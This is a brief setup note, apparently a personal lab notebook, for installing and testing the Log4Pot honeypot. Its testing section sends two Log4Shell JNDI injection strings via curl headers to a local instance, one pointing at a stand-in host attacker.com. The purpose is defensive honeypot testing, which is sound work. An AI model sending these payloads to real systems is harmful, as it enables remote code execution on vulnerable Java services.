# log4pot
- [https://github.com/thomaspatzke/Log4Pot](https://github.com/thomaspatzke/Log4Pot)

## setup
### setup with poetry
```bash
# install poetry
curl -sSL https://install.python-poetry.org | python3 -
sudo cp /home/vagrant/.local/bin/poetry /usr/bin/poetry
# sudo apt install python3-poetry -y

# isntall pycurl
sudo apt install libcurl4-openssl-dev libssl-dev python3-dev build-essential -y

git clone https://github.com/thomaspatzke/Log4Pot
cd Log4Pot

poetry install # install dep
poetry run python log4pot-server.py --help
# poetry run python log4pot-server.py @log4pot.conf
poetry run python log4pot-server.py --port 8080 --log log4pot.log
```

### setup python (blm nyoba)
```bash
git clone https://github.com/thomaspatzke/Log4Pot
cd Log4Pot
python3 log4pot-server.py --help
python3 log4pot-server.py --port 8080 --log log4pot.log
```

## testing
```bash
curl -A '${jndi:ldap://127.0.0.1:1389/Exploit}' http://127.0.0.1:8080/
curl -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}' http://127.0.0.1:8080/

cat log4pot.log
```

### log analyzer (masih error)
```bash
# poetry
poetry shell
pip uninstall -y numpy pandas
pip install "numpy<1.24" "pandas<1.6"

python3 log4pot-loganalyzer.py -o analysis log4pot.log
```
